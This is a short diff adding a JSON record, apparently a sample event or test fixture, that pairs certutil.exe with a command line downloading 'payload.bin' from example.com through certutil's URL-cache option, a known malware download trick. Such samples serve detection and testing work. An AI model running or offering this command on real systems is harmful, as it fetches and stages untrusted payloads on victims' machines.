@@ -1,0 +1,4 @@
+{
+  "process": "C:\\Windows\\System32\\certutil.exe",
+  "cmdline": "certutil -urlcache -f http://example.com/payload.bin payload.bin"
+}
